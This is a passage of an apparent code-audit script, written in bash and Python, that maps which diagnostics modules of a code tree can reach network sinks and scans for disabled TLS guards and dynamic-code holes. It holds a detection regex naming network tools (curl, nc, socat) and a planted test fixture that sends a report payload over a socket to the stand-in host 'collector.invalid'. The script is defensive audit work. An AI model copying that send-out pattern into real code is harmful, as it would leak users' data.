imp = re.compile(r'^\s*(?:from\s+([A-Za-z_][\w.]*)\s+import|import\s+([A-Za-z_][\w.]*))')
SINKRE = re.compile(r'\bsocket\b|\bsocket\.|urllib\.request|http\.client|\bssl\b|webbrowser|subprocess\.|ctypes\.|os\.system|socket\.socket|urlopen|requests\.|httpx\.'
                    # a network binary in argv is an outbound channel the exec family would otherwise hide
                    r'|\b(curl|wget|nc|ncat|ssh|scp|sftp|rsync|dig|openssl|socat)\b')
graph = collections.defaultdict(set)
for f in py:
    d = f.rsplit('/',1)[0] if '/' in f else ''
    for line in blob[f].splitlines():
        m = imp.match(line)
        if not m: continue
        name = m.group(1) or m.group(2)
        cand = mod2file.get(name) or (mod2file.get((d+'.'+name).replace('/','.')) if d else None)
        if cand and cand != f: graph[f].add(cand)
EDGES = sum(len(v) for v in graph.values())
SINK = {f for f in py if SINKRE.search(blob[f])}
def closure(seeds):
    seen=set(); st=list(seeds)
    while st:
        n=st.pop()
        if n in seen: continue
        seen.add(n); st.extend(graph.get(n,()))
    return seen
down = closure(SINK)
rows=[]
for f in shipped:
    reach = f in SINK or bool(graph[f] & (SINK|down))
    if re.search(r'def\s+(snapshot|metrics|status|health|report|collect|build_payload|telemetry)\w*\(|/metrics|\.snapshot\(|prometheus', blob[f]):
        hits = sorted({m for m in re.findall(SINKRE, blob[f])})
        rows.append((f,'report-builder','reaches-a-sink' if reach else 'no-sink-in-closure', ','.join(hits[:3]) or '-'))
with open(os.path.join(RUN, outname),'w') as fh:
    for r in rows: fh.write('\t'.join(r)+'\n')
print(PFX+"SHIPPED_NONTEST_MODULES=%d " % len(shipped) + PFX+"PY_MODULES_TOTAL=%d" % len(py))
# IMPORT_EDGES is the guard: if the import regex stops matching, the graph is empty, EVERY builder
# prints no-sink-in-closure, SINK_CAPABLE_MODULES still looks plausible, and "no diagnostics channel
# reaches a sink" is emitted confidently and falsely. Edges are resolved intra-tree imports only.
print(PFX+"S15_IMPORT_EDGES=%d " % EDGES + PFX+"MODULES_WITH_EDGES=%d " % sum(1 for v in graph.values() if v)
      + PFX+"SINK_CAPABLE_MODULES=%d " % len(SINK) + PFX+"IMPORT_CLOSURE_OF_SINKS=%d " % len(down)
      + PFX+"SHIPPED_IN_CLOSURE=%d " % len(down & set(shipped)) + PFX+"REPORT_BUILDERS=%d" % len(rows))
print(PFX+"S15_REACHING=%d " % sum(1 for r in rows if r[2]=='reaches-a-sink')
      + PFX+"S15_NOT_REACHING=%d" % sum(1 for r in rows if r[2]=='no-sink-in-closure'))
for r in rows: print("   ", '\t'.join(r))
PY
# ROOT is "." for the tree run: this script has already cd'd into the tree.
runpy S15_PROCEDURE_REAL "$RUN/s15-procedure.py" . "$RUN" "$UNIV" diagnostics-shaped.tsv
# THE guard neckbeard asked for: an empty import graph makes every builder print no-sink-in-closure
# and every "no diagnostics channel reaches a sink" sentence in the plan false, while the line count
# still looks plausible. Threshold is 1 because the assertion is "the graph is alive", not "sized".
S15E=$(grab S15_PROCEDURE_REAL S15_IMPORT_EDGES)
chk S15_IMPORT_EDGES_NONZERO          ge 1 "${S15E:-0}"
S15B=$(grab S15_PROCEDURE_REAL S15_REACHING)
echo "S15_ROWS_FROM_PROCEDURE=$(awk 'END{print NR+0}' "$RUN/diagnostics-shaped.tsv") S15_REACHING_A_SINK=${S15B:-?}"
# ---------------- S15 control: two planted report-builders, one whose import closure reaches a sink
# and one that does not. The control PASSES only if the verdicts differ AND are the planted ones: a
# procedure that marks both the same has no discrimination and its real-tree zeros prove nothing.
mkdir -p "$RUN/s15-fixture/serve" "$RUN/s15-fixture/serve/engine"
cat > "$RUN/s15-fixture/serve/egress.py" <<'X'
import socket
def post(payload):
    s = socket.socket(); s.connect(("collector.invalid", 9999)); s.sendall(payload)
X
cat > "$RUN/s15-fixture/serve/metrics.py" <<'X'
from serve.egress import post          # the ONLY difference between the two builders
def snapshot(): return {"q": 1}
def report(): post(bytes(str(snapshot()), "utf-8")); return {}
X
cat > "$RUN/s15-fixture/serve/metrics_local.py" <<'X'
def snapshot(): return {"q": 1}       # no import of anything sink-bearing: must read no-sink-in-closure
def report(): return snapshot()
X
find "$RUN/s15-fixture" -type f | sed "s|^$RUN/s15-fixture/||" | LC_ALL=C sort > "$RUN/s15-fixture-universe.txt"
runpy S15_PROCEDURE_CONTROL "$RUN/s15-procedure.py" "$RUN/s15-fixture" "$RUN" "$RUN/s15-fixture-universe.txt" s15-fixture-rows.tsv CTRL_
# (no `need s15-fixture-rows.tsv` — same deletion as S14_CONTROL_ROWS_FILE above: an empty or missing
# file makes S15V empty, and `chk`'s own non-empty guard fails the eq. The `need` could only ever agree
# with the assertion beside it.)
# mod2file keys are dotted paths, so the planted import must resolve as serve.egress; if it does not,
# BOTH builders read no-sink-in-closure and the control fails — which is the point of running it.
S15V=$(awk -F'\t' '{print $1"="$3}' "$RUN/s15-fixture-rows.tsv" | LC_ALL=C sort | paste -sd' ' -)
S15_EXPECT='serve/metrics.py=reaches-a-sink serve/metrics_local.py=no-sink-in-closure'
chk S15_CONTROL_VERDICTS              eq "$S15_EXPECT" "$S15V"
echo "S15_CONTROL_VERDICTS=$S15V"
echo "S15_CONTROL_EXPECTED=$S15_EXPECT"
awk -F'\t' 'BEGIN{OFS="\t"}{print $1, "diagnostics-shaped"}' "$RUN/diagnostics-shaped.tsv" \
  | LC_ALL=C sort -u > "$RUN/diagnostics-shaped.files.tsv"

# S18 MODEL-INSTRUCTION SURFACE: declared (name-level) + phrase (content-level), both mechanical.
model_phrase=$(awk -F'\t' '$1=="model-instruction"{print $2}' "$RUN/families.tsv")
grep -E '(^|/)(AGENTS|CLAUDE|GEMINI)\.md$|^\.github/|copilot-instructions|cursorrules|(^|/)CONTRIBUTING\.md$' \
  "$UNIV" | LC_ALL=C sort -u > "$RUN/model-instruction.declared.txt"
xargs -a "$UNIV" -d '\n' -r grep -IlE -e "$model_phrase" 2>/dev/null | cut -d: -f1 \
  | LC_ALL=C sort -u > "$RUN/model-instruction.phrase-all.txt"
LC_ALL=C comm -23 "$RUN/model-instruction.phrase-all.txt" "$RUN/model-instruction.declared.txt" \
  > "$RUN/model-instruction.phrase.txt"
awk 'BEGIN{OFS="\t"}{print $1,"declared"}' "$RUN/model-instruction.declared.txt" > "$RUN/model-instruction.pairs.tsv"
awk 'BEGIN{OFS="\t"}{print $1,"phrase"}'   "$RUN/model-instruction.phrase.txt"     >> "$RUN/model-instruction.pairs.tsv"
LC_ALL=C cat "$RUN/model-instruction.declared.txt" "$RUN/model-instruction.phrase.txt" | LC_ALL=C sort -u \
  > "$RUN/model-instruction.set.txt"
awk 'BEGIN{OFS="\t"}{print $1,"model-instruction"}' "$RUN/model-instruction.set.txt" > "$RUN/model-instruction.files.tsv"
echo "MODEL_INSTRUCTION_DECLARED=$(wc -l < "$RUN/model-instruction.declared.txt") PHRASE_ONLY=$(wc -l < "$RUN/model-instruction.phrase.txt") UNION=$(wc -l < "$RUN/model-instruction.set.txt")"

# S16 SUBSTRATE: imports, and the dynamic-name holes the plan names.
while IFS= read -r f; do case "$f" in *.py) grep -HoE '^[[:space:]]*(from|import)[[:space:]]+[A-Za-z_][A-Za-z0-9_.]*' -- "$f" 2>/dev/null;; esac; done \
  < "$UNIV" | awk '{print $2}' | LC_ALL=C sort -u > "$RUN/py-import-names.txt"
echo "PY_IMPORT_NAMES=$(wc -l < "$RUN/py-import-names.txt")"
for h in importlib __import__ 'eval(' 'exec(' 'compile(' 'getattr(' 'chr(' b64decode codecs.decode bytes.fromhex 'globals()' 'vars('; do
  n=$(while IFS= read -r f; do case "$f" in *.py) grep -HFo -- "$h" -- "$f" 2>/dev/null;; esac; done < "$UNIV" | wc -l)
  printf 'HOLE %-14s hits=%s\n' "$h" "$n"
done
echo "S16_NOTE the import substrate is a SUBSTRATE: reported here, never a column-6 token; the dynamic-name holes above are the shapes that could hide an S19 library name, so S19's tally is bounded by them"

# S17 SUBSTRATE: build-time external deps, and whether any are fetched.
grep_files 'find_package|FetchContent|ExternalProject|add_subdirectory|target_link_libraries|GIT_REPOSITORY|URL[[:space:]]+https?|download_file|file\(DOWNLOAD' "$UNIV" > "$RUN/build-deps.raw.tsv" || true
echo "BUILD_DEP_LINES=$(awk 'END{print NR+0}' "$RUN/build-deps.raw.tsv")"
echo "-- find_package targets --"; grep -hoE 'find_package[[:space:]]*\([A-Za-z0-9_]+' "$RUN/build-deps.raw.tsv" | LC_ALL=C sort -u | sed 's/.*(/    /'
echo "FETCHCONTENT_OR_EXTERNALPROJECT=$(grep -cE 'FetchContent_Declare|ExternalProject_Add' "$RUN/build-deps.raw.tsv")"
grep -hoE 'https?://[^ "'"'"')]+' "$RUN/build-deps.raw.tsv" | LC_ALL=C sort -u > "$RUN/build-dep-urls.txt"
echo "BUILD_FILE_URL_LITERALS=$(wc -l < "$RUN/build-dep-urls.txt")"; sed 's/^/    /' "$RUN/build-dep-urls.txt"

# THE GUARD-INVERSION SCAN — pre-registered with a named expectation, and now a SENTINEL rather than
# a list. The plan's "one outbound channel" Key Fact rests on the TLS/proxy/redirect guards of one
# module; if a guard is inverted anywhere else, the Key Fact is about the wrong file. Expectation was
# declared BEFORE the scan (see plan 02 T3 notes / this file's git history). Production code only:
# tests legitimately disable TLS guards to point at localhost, so counting them as inversions would
# make the number meaningless — but they are counted SEPARATELY, not dropped.
echo "-- guard-inversion scan --"
GV='ssl\._create_unverified_context|check_hostname[[:space:]]*=[[:space:]]*False|verify_mode[[:space:]]*=[[:space:]]*ssl\.CERT_NONE|ssl\.CERT_NONE|ProxyHandler|RedirectHandler|build_opener|install_opener|HTTPConnection\(|HTTPSConnection\('
grep_files "$GV" "$UNIV" | cut -d: -f1 | LC_ALL=C sort -u > "$RUN/guard-inversion-files.txt"
awk '!/^serve\/tests\// && !/^tests\// && !/^tools\/test_/ && $0 !~ /\/test_[^\/]*\.py$/ && $0 !~ /_test\.py$/' \
  "$RUN/guard-inversion-files.txt" > "$RUN/guard-inversion-prod-files.txt"
GI_PROD=$(wc -l < "$RUN/guard-inversion-prod-files.txt")
GI_TEST=$(awk 'END{print NR+0}' "$RUN/guard-inversion-files.txt")
# The pre-registered prediction was "exactly one file, serve/engine/image_source.py". It MISSED: the
# tree has more. Two things must both be true, and they are different mechanisms:
#   (a) the MISS stays on the page forever — it is a FINDING, and findings are not deleted to make a
#       run green. Printed as FIND, never as a pass.
#   (b) the instrument still bites: the population measured on 2026-11-05 is FROZEN here, so any new
#       guard inversion anywhere, or a removal, fails the run. Asserting the original wrong guess
#       would have made the script permanently red, which trains the reader to ignore red.
# FROZEN VALUE, measured 2026-11-05 on vendor/basalt @ dc047a77 by this scan: 3 production files
# (serve/engine/image_source.py, tools/serve_soak.py, tools/zero_doorbell_check.py); 11 files counting
# test code. Re-measure, never type.
GI_FROZEN_PROD=3
chk GUARD_INVERSION_POPULATION_FROZEN eq "$GI_FROZEN_PROD" "$GI_PROD"
echo "GUARD_INVERSION_PROD_FILES=$GI_PROD  TOTAL_INCLUDING_TESTS=$GI_TEST  files=guard-inversion-prod-files.txt"
sed 's/^/    /' "$RUN/guard-inversion-prod-files.txt"
# Wording corrected on 2026-11-05 after re-reading what the three files actually are. The first version
# of this line declared the plan's Key Fact "about the wrong file". That was an overstatement of my own
# making: the Key Fact is scoped *in the server*, and `serve/engine/image_source.py` is still the only
# hit under `serve/`. What the prediction actually got wrong is the NON-TEST population, not the server.
# The two extra files are dev tools — and `tools/serve_soak.py:31,89` is the one that matters: a plain
# `http.client.HTTPConnection(u.hostname, u.port)` with the host taken straight from a URL, unpinned,
# no TLS at all, in a directory `Dockerfile:57` copies into the shipped image. That is census.md's
# finding; the Key Fact survives it.
GI_SERVE=$(grep -c '^serve/' "$RUN/guard-inversion-prod-files.txt" || true)
echo "FIND GUARD_INVERSION_PREDICTION_MISSED predicted 1 file (serve/engine/image_source.py), observed $GI_PROD non-test files, of which $GI_SERVE under serve/. Pre-registered 2026-11-05 BEFORE the scan. The prediction was right about the SERVER and wrong about the non-test population: the extra files are tools/serve_soak.py and tools/zero_doorbell_check.py. census.md records both, and the Key Fact stands as scoped."

# THE LISTEN SIDE — nothing in the plan's section list owns "binds 0.0.0.0", and it is a cell of
# T14's channel matrix, so the census records it rather than letting it fall between sections.
# Total is printed BEFORE any truncation: a `head -12` that hides the total turns 14 candidates
# into 12 on the page.
echo "-- listen side: what binds, and to what --"
grep_files 'bind[[:space:]]*\(|\.listen\(|listen[[:space:]]*\(|0\.0\.0\.0|::1|INADDR_ANY' "$UNIV" \
  | cut -d: -f1 | LC_ALL=C sort -u > "$RUN/listen-files.txt"
echo "LISTEN_CANDIDATE_FILES=$(wc -l < "$RUN/listen-files.txt") (all listed, no truncation)  files=listen-files.txt"
sed 's/^/    /' "$RUN/listen-files.txt"

# --------------------------------------------------------------- 5 sites
# --------------------------------------------------------------- § canary field (hoodie M4)
# The zero-qualifier used to live only on the FAMILY line, ~100 lines above the SECTION table that
# census.md pastes, so `status=SCANNED_NONE` read identically for "zero, proven in this tree" and
# "zero, the pattern has only ever fired on my own fixtures". The scorer is a separate script and may
# not have run yet, so the census prints the FIELD always: missing data reads NOT_YET_SCORED, which
# forces a look. An absent column invites an assumption; a present column never does.
# NOTE this is defined BEFORE the section loop that calls it: bash executes line by line, so a
# function defined below its first call is simply "command not found" at call time.
SCORE="$T3/t3-canary-score.tsv"   # family <TAB> planted <TAB> fired <TAB> verdict
canary_field() { # canary_field <family>
  [ -f "$SCORE" ] || { printf 'canary=NOT_YET_SCORED'; return; }
  local r; r=$(awk -F'\t' -v f="$1" '$1==f{printf "canary=planted=%s/fired=%s %s", $2, $3, $4; exit}' "$SCORE")
  printf '%s' "${r:-canary=NOT_PLANTED}"
}
: > "$RUN/sites.tsv"
EXCL=0
# the routing table is read positionally, so fields this loop does not consume (why) still have to be
# named to keep the later ones aligned. Disabling rather than renaming: a `_` placeholder reads as
# "this column is dead", and it is not — it is the triage reason that lands in census column 8.
# shellcheck disable=SC2034
while IFS=$'\t' read -r sec fam tdef kind gran excl why forcefg; do
  [ -n "${fam:-}" ] || continue
  [ "$kind" = site ] || continue
  src="$RUN/$fam.narrow.tsv"
  if [ ! -s "$src" ]; then
    : > "$RUN/$fam.code.tsv"; : > "$RUN/$fam.sites-raw.tsv"
    # No `status=` on SECTION lines. It was `SCANNED_NONE` when narrow=0 and rows=0 — both printed on
    # this same line — and in the other branch it was literally `[ rows>0 ] && SCANNED_HITS ||
    # NONE_AFTER_EXCL`, a pure function of `rows=` sitting beside it, under the SAME field name the
    # FAMILY line uses for a completely different claim (fixture-only proof). One field, two meanings,
    # one of them redundant: deleted rather than renamed.
    # line_hits, not raw_rows. `raw_rows` was the number of records in $fam.sites-raw.tsv — and for a
    # declared-file section that file has ALREADY been overwritten by the collapse a few lines above, so
    # files=, rows= and raw_rows= all printed the same number (measured 2026-11-05: S12 11/11/11,
    # S13 11/11/11, S19 40/40/40) while the line hits actually behind them were 69, 1801 and 296. One
    # field name, two meanings, told apart only by reading another column. The preserved pre-collapse file
    # is the honest source; for a line-granular section no such file exists and sites-raw IS the line set.
    printf 'SECTION %-5s %-22s narrow=0    excluded_docs=0    files=0    line_hits=0    rows=0    gran=%-6s %s\n' "$sec" "$fam" "$gran" "$(canary_field "$fam")"
    continue
  fi
  if [ "$excl" = docs ]; then
    # NOTE the shape of this awk: the BEGIN block must CLOSE before the main rule. With the body
    # left inside BEGIN{} the whole program runs once with no input line, prints one row of
    # empties, and every family silently reports sites=1. That is what this line used to be.
    awk -F'\t' -v ex="$EXCLUDE_DIRS" 'BEGIN{n=split(ex,E," ")}
      {p=$1; sub(/:[0-9]+$/,"",p); drop=0; for(i=1;i<=n;i++){ if (index(p, E[i])==1) drop=1 }; if(!drop) print }' \
      "$src" > "$RUN/$fam.code.tsv"
  else
    cp "$src" "$RUN/$fam.code.tsv"
  fi
  dropped=$(( $(awk 'END{print NR+0}' "$src") - $(awk 'END{print NR+0}' "$RUN/$fam.code.tsv") ))
  EXCL=$((EXCL+dropped))
  case "$fam" in
    parser-network-bytes|vendored-third-party)
      awk -F'\t' 'NR==FNR{t[$1]=1; next} {p=$1; sub(/:[0-9]+$/,"",p); if (p in t) print $0}' \
          "$T3/tierA-files.tsv" "$RUN/$fam.code.tsv" > "$RUN/$fam.sites-raw.tsv" ;;
    *) cp "$RUN/$fam.code.tsv" "$RUN/$fam.sites-raw.tsv" ;;
  esac
  # hits_in_file is computed BEFORE the collapse so granularity=file stays lossless
  if [ "$gran" = file ]; then
    # Preserve the line-level hits the collapse is about to throw away. Defect found by re-reading the
    # output: a declared-file-granular section (S12/S13/S15/S18/S19) collapsed here, BEFORE the row
    # writer ran, so the writer never knew a collapse had happened and stamped `line-hit` on rows that
    # stand for many lines — serve/engine/image_source.py carries 28 net-library-import hits and its one
    # row claimed one. The forced collapses (line granularity overridden for tests/ + unowned files)
    # already label themselves honestly; the DECLARED ones did not, because the collapse was elsewhere.
    cp "$RUN/$fam.sites-raw.tsv" "$RUN/$fam.sites-linelevel.tsv"
    awk -F'\t' '{p=$1; sub(/:[0-9]+$/,"",p); c[p]++}
      END{for (k in c) print k"\t"c[k]}' "$RUN/$fam.sites-raw.tsv" > "$RUN/$fam.hits-per-file.tsv"
    awk -F'\t' 'NR==FNR{c[$1]=$2; next} {p=$1; sub(/:[0-9]+$/,"",p); if (!(p in seen)) {seen[p]=1; print $0"\t"c[p]}}' \
      "$RUN/$fam.hits-per-file.tsv" "$RUN/$fam.sites-raw.tsv" > "$RUN/$fam.sites-file.tsv"
    mv "$RUN/$fam.sites-file.tsv" "$RUN/$fam.sites-raw.tsv"
  else
    awk -F'\t' '{p=$1; sub(/:[0-9]+$/,"",p); c[p]++} END{for (k in c) print k"\t"c[k]}' \
      "$RUN/$fam.sites-raw.tsv" > "$RUN/$fam.hits-per-file.tsv"
    awk -F'\t' 'NR==FNR{c[$1]=$2; next}{p=$1; sub(/:[0-9]+$/,"",p); print $0"\t"c[p]}' \
      "$RUN/$fam.hits-per-file.tsv" "$RUN/$fam.sites-raw.tsv" > "$RUN/$fam.sites-hits.tsv"
    mv "$RUN/$fam.sites-hits.tsv" "$RUN/$fam.sites-raw.tsv"
  fi
  # COLUMNS: 1 path:line (procedures: a bare path, or KEY:<name> for S14 — two key shapes in one column,
  #          documented because rsplit-style consumers happen to survive it today)
  #          2 primitive  3 routing-verdict  4 assigned-TN  5 section
  #          6 hits_in_file on scan rows, ENTITIES REPRESENTED on procedure rows (S14/S15/S18 write a
  #            literal 1 there — see FIND ENTITY_GRANULAR_ROWS_WITHOUT_LINE_EVIDENCE)
  #          7 TN-provenance  8 observation. Column 3 carries ONE vocabulary (needs-T<n>) and column
  #          8 carries what the census actually SAW. They were one column until now, which made the
  #          canary expect-key path+primitive+disposition ambiguous on every procedure row.
  # Row granularity is forced to FILE where the decision unit is not a line (neckbeard): a test file
  # that calls subprocess.run twelve times is ONE decision, and an unowned file cannot be decided a
  # line at a time because nobody has read it yet. Left at LINE for owned production code, where a
  # reviewer genuinely does adjudicate per call site.
  awk -F'\t' -v fam="$fam" -v sec="$sec" -v tdef="$tdef" -v map="$TIERMAP" -v gran="$gran" \
      -v force_gran="$forcefg" -v llvl="$RUN/$fam.sites-linelevel.tsv" '
    BEGIN{ while ((getline l < map) > 0) { split(l, a, "\t"); if (a[2] != "") tn[a[1]] = a[2] }
      # Declared-file granularity was collapsed ABOVE, so the input below already holds one row per file
      # and this awk cannot see what it cost. Re-reading the preserved line-level file is the only way the
      # row can name its own evidence. cnt[p] must agree with hits_in_file, and
      # SITE_ROWS_COLLAPSE_COUNT_MATCHES_HITS_IN_FILE is what asserts that it does.
      if (gran == "file") { while ((getline l < llvl) > 0) { split(l, b, "\t"); q = b[1]; sub(/:[0-9]+$/, "", q)
        cnt[q]++; lst[q] = lst[q] ((lst[q] == "") ? b[1] : ", " b[1]) } } }
    { raw=$1; p=$1; sub(/:[0-9]+$/,"",p)
      owned = (p in tn) && tn[p] != ""
      istest = (p ~ /^(serve\/tests|tests)\//) || (p ~ /(^|\/)(test_[^\/]*|[^\/]*_test)\.(py|cpp|cc|c|hpp)$/)
      # force_gran comes from routing.tsv column 9, NOT from an environment variable: a knob that
      # lives outside the predicate file is outside PREDICATE_SHA256, so two runs with the same hash
      # could produce different row counts. Every knob that moves a count has to be hashed.
      force = (force_gran == "yes" && gran == "line" && (!owned || istest))
      key = force ? p : raw
      if (!(key in seen)) { seen[key]=1; order[++n]=key; pth[key]=p; hif[key]=$3; nf[key]=0; lines[key]=""; fwhy[key]=(istest ? "test" : "unowned") }
      nf[key]++
      lines[key] = lines[key] ((lines[key]=="") ? raw : "," raw)
    }
    END{ for (i=1; i<=n; i++) { k=order[i]; p=pth[k]
      owned = (p in tn) && tn[p] != ""
      t = owned ? tn[p] : tdef
      # Three states, and the middle one is what was missing: a declared-file row used to print
      # `line-hit`, the same word a genuine one-line row prints. Both collapses name their CAUSE in a
      # parenthetical rather than in a prefix, because a prefix is exactly what a skimming eye skips and
      # the two causes are different decisions with different owners (routing.tsv declares granularity;
      # this script forces it for test and unowned files). The two patterns stay disjoint on purpose:
      # DECLARED_LABELS_EQ_FILES_COLUMN counts `(declared)` and GRANULARITY_FORCE_IS_FIRED counts
      # `(forced:` — renaming both was only safe because both counts moved in the same edit.
      # (awk note: no apostrophes anywhere in this program, including comments — it is inside single
      # quotes, and one closes the quoting. `bash -n` finds it; it has bitten this block twice.)
      if (k == p)              obs = ("file-granular (forced: " fwhy[k] "): " nf[k] " line hit(s): " lines[k])
      else if (gran == "file") obs = ("file-granular (declared): " (cnt[p]+0) " line hit(s): " lst[p])
      else                     obs = "line-hit"
      print k "\t" fam "\tneeds-" t "\t" t "\t" sec "-" fam "\t" hif[k] "\t" (owned ? "tier" : "default") "\t" obs } }' \
    "$RUN/$fam.sites-raw.tsv" >> "$RUN/sites.tsv"
  # ROWS FIRST, THEN THE TABLE LINE. The SECTION line used to print BEFORE the row writer ran, so
  # it carried the PRE-force count: it advertised sites=34 for a section that had contributed 12
  # rows, contradicting SITES= on the same page. `rows` is counted out of sites.tsv; `raw_rows`
  # keeps the pre-force count visible so the collapse stays measurable per section.
  ROWS=$(awk -F'\t' -v s="$sec-" '$5 ~ ("^"s) {c++} END{print c+0}' "$RUN/sites.tsv")
  # line_hits sits LEFT of rows so `69 → 11` is one eye movement, and it comes from the preserved
  # pre-collapse file: see the zero-branch comment above for why sites-raw cannot answer this question
  # for a declared-file section. Same field order in both SECTION printfs — one shape, both branches.
  LL="$RUN/$fam.sites-linelevel.tsv"
  [ -s "$LL" ] || LL="$RUN/$fam.sites-raw.tsv"
  printf 'SECTION %-5s %-22s narrow=%-5s excluded_docs=%-4s files=%-4s line_hits=%-5s rows=%-5s gran=%-6s %s\n' \
    "$sec" "$fam" \
    "$(awk 'END{print NR+0}' "$src")" "$dropped" \
    "$(cut -f1 "$RUN/$fam.sites-raw.tsv" | sed 's/:[0-9]*$//' | LC_ALL=C sort -u | wc -l)" \
    "$(awk 'END{print NR+0}' "$LL")" \
    "$ROWS" "$gran" "$(canary_field "$fam")"
done < "$RUN/routing.tsv"
echo "EXCLUDED_DOCS_SITE_ASSET_HITS=$EXCL  # the exclusion is named (docs/ site/ assets/); raw hit lists stay in the run dir, nothing is discarded"
ROWS_COLLAPSED=$(awk -F'\t' '$8 ~ /\(forced: /{c++} END{print c+0}' "$RUN/sites.tsv")
echo "SITE_ROWS_AFTER_GRANULARITY_FORCE=$ROWS_COLLAPSED  # FORCED collapses only (tests/ + unowned files where line-granularity was overridden); the raw line hits are named inside column 8. Declared-file sections are counted separately below."
# A sentinel for the sentinel: the force is a feature that can die silently (the awk once compared
# force_gran against 1 after the value became "yes", and the row count simply rose to the unforced
# number with nothing failing). It is only exercised on TAG=real, where the tree is known to contain
# test code and unowned files, so a zero there means the force stopped firing, not that the tree is clean.
if [ "$TAG" = real ]; then
  chk GRANULARITY_FORCE_IS_FIRED      ge 1 "$ROWS_COLLAPSED"
fi

# The other half of the granularity story (defect found by re-reading the output, not by a sentinel).
# Sections DECLARED file-granular in routing.tsv collapse before the row writer, which used to leave
# every one of their rows stamped `line-hit`: serve/engine/image_source.py holds 28 net-library-import
# line hits and its row claimed one.
ROWS_DECLARED_COLLAPSED=$(awk -F'\t' '$8 ~ /\(declared\): /{c++} END{print c+0}' "$RUN/sites.tsv")
# What the label's own count must agree with, and what that agreement is actually worth (neckbeard).
# Column 6 comes from counting records of the pre-collapse sites-raw.tsv; the label's N comes from
# counting records of a cp of THAT SAME FILE. Same bytes, two passes — so this is NOT a coverage check.
# A narrow pattern that under-reports, or the docs/tier-A filters dropping hits, shrinks both together.
# What it does catch, and it is the only thing in the file that does: `getline` from a missing file exits
# SILENTLY inside awk and would print "collapse of 0"; the mv that replaces sites-raw with the collapsed
# set drifting past the cp; a path enumerated one way in column 6 and another in the label. It guards
# pipeline order and getline failure. It cannot catch the original defect, which was a wrong WORD
# attached to a number that would have agreed.
COLLAPSE_COUNT_MISMATCH=$(awk -F'\t' '
  $8 ~ /\(declared\): / {
    n = $8; sub(/^.*\(declared\): /, "", n); sub(/ line hit\(s\):.*/, "", n)
    if (n + 0 != $6 + 0) bad++ } END{ print bad + 0 }' "$RUN/sites.tsv")
# The INDEPENDENT comparison. The three declared-file site sections are read from routing.tsv rather
# than listed here, and their file counts come from `cut | sed | sort -u | wc -l` over each family's
# collapsed hit file — a different expression from the label scan, so if the labelling branch dies the two
# sides part. (The 153→91 arithmetic I first leaned on closes by construction of the three-way label
# branch: it proves the partition is exhaustive, nothing about how many rows SHOULD be collapses.)
FILES_SUM=0
while IFS= read -r dfam; do
  [ -n "$dfam" ] || continue
  FILES_SUM=$(( FILES_SUM + $(cut -f1 "$RUN/$dfam.sites-raw.tsv" | sed 's/:[0-9]*$//' | LC_ALL=C sort -u | wc -l) ))
done < <(awk -F'\t' '$4=="site" && $5=="file"{print $2}' "$RUN/routing.tsv")
echo "SITE_ROWS_ON_DECLARED_FILE_GRANULARITY=$ROWS_DECLARED_COLLAPSED  # each names its raw line hits inside column 8; per-section pre-collapse line counts are in <family>.sites-linelevel.tsv"
chk DECLARED_LABELS_EQ_FILES_COLUMN   eq "$FILES_SUM" "$ROWS_DECLARED_COLLAPSED"
chk COLLAPSE_COUNT_MATCHES_HITS_IN_FILE z    "$COLLAPSE_COUNT_MISMATCH"
# Disclosed, not asserted (neckbeard). Two granularity gaps this script does NOT close, named so the next
# reader does not infer they were checked:
echo "FIND ENTITY_GRANULAR_ROWS_WITHOUT_LINE_EVIDENCE sections=S14,S15,S18  # S18's phrase rows drop line numbers at the cut -d: -f1 before any collapse exists (one row per file, no linelevel file, no label); S15's rows are per report-builder and S14's per config key, and all three write a LITERAL 1 into column 6, whose header says hits_in_file. No chk compares that literal: a comparison against a constant is the tautology this file has been deleting, not one it should mint. Column 6 therefore means entities-represented on procedure rows and hits-in-file on scan rows."

# the procedure sections produce rows too. Column 7 is TN-provenance for EVERY row, including these;
# what the procedure observed goes in column 8. S14 used to write sinkless/consumed into column 7,
# which broke the column's vocabulary on 12 rows and made a provenance guard impossible.
# the three procedure-row emitters append to the same file, so they are one redirect group rather
# than three: shellcheck's SC2129, but also the reason a `> ` typo in one of them is now impossible
# without truncating all three, which is a louder failure than silently dropping one family's rows.
{
awk -F'\t' 'NR==FNR{if ($2!="") tn[$1]=$2; next}
  { t = ("serve/config.py" in tn && tn["serve/config.py"]!="") ? tn["serve/config.py"] : "T9"
    print "KEY:"$3 "\torphan-config-key\tneeds-" t "\t" t "\tS14-orphan-config-key\t1\ttier\t" (($1 ~ /^ORPHAN|^DROPPED/) ? "sinkless" : "consumed") }' \
  "$TIERMAP" "$RUN/orphan-config-key.tsv"
awk -F'\t' 'NR==FNR{if ($2!="") tn[$1]=$2; next}
  { t = ($1 in tn && tn[$1]!="") ? tn[$1] : "T6a"
    print $1 "\tdiagnostics-shaped\tneeds-" t "\t" t "\tS15-diagnostics-shaped\t1\t" (($1 in tn && tn[$1]!="") ? "tier" : "default") "\t" $2 "/" $3 }' \
  "$TIERMAP" "$RUN/diagnostics-shaped.tsv"
awk -F'\t' 'NR==FNR{if ($2!="") tn[$1]=$2; next}
  { t = ($1 in tn && tn[$1]!="") ? tn[$1] : "T14"
    print $1 "\tmodel-instruction\tneeds-" t "\t" t "\tS18-model-instruction\t1\t" (($1 in tn && tn[$1]!="") ? "tier" : "default") "\t" $2 }' \
  "$TIERMAP" "$RUN/model-instruction.pairs.tsv"
} >> "$RUN/sites.tsv"

# --------------------------------------------------------------- 6 reconciliations
SITES=$(awk 'END{print NR+0}' "$RUN/sites.tsv")
SECSUM=$(while IFS=$'\t' read -r sec fam rest; do
           s=$(awk -F'\t' -v s="$sec-" 'BEGIN{n=0} $5 ~ ("^"s){n++} END{print n+0}' "$RUN/sites.tsv"); printf '%s\n' "$s"
         done < "$RUN/routing.tsv" | awk '{s+=$1} END{print s+0}')
echo "SITES=$SITES"
echo "SUM_OF_SECTION_COUNTS=$SECSUM SITES_ROWS=$SITES RECONCILE=$([ "$SECSUM" -eq "$SITES" ] && echo OK || echo FAIL)"
# SECTIONS_EMITTING / SECTIONS_ZERO are counted from the routing table, one row per site section:
# a section that emits no rows is not missing, it is a reported zero, and the two must be named
# separately or "16 sections" reads as "all of them found something".
# An array, not a word-split string: `for s in $SITE_SECS` globs its own contents (a section named
# `*` would expand against the cwd), and the old `printf '%s\n' $SITE_SECS | wc -l` reported ONE
# section when the list was empty — printf with no arguments emits a single newline. An empty
# routing table therefore counted as a section that emitted nothing.
mapfile -t SITE_SECS < <(awk -F'\t' '$4=="site"{print $1}' "$RUN/routing.tsv" | LC_ALL=C sort -u)
